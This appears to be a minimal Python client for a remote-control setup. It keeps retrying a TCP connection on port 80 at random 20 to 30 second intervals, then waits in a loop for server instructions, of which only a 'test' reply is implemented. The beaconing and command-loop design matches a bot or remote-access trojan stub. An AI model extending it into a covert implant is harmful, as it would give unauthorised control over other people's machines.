#Imports
import socket
import time
import random
 
#Variables
lHost = ""                    #Server IP
port = 80                     #Connection Port
 
#Functions
 
def send(msg):
    s.send(msg.encode("UTF-8"))
   
def getInstructions():
    while True:
        msg = s.recv(4096)
        inst = msg.decode("UTF-8")
       
        #Instructions
       
        if inst == "test":
            try:
                send("[OK]Test works!")
            except:
                pass
 
#Connection
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = socket.gethostname()
connected = False
while connected == False:
    try:
        s.connect((host, port))
        connected = True
    except:
        sleepTime = random.randint(20, 30)
        time.sleep(sleepTime)
getInstructions()
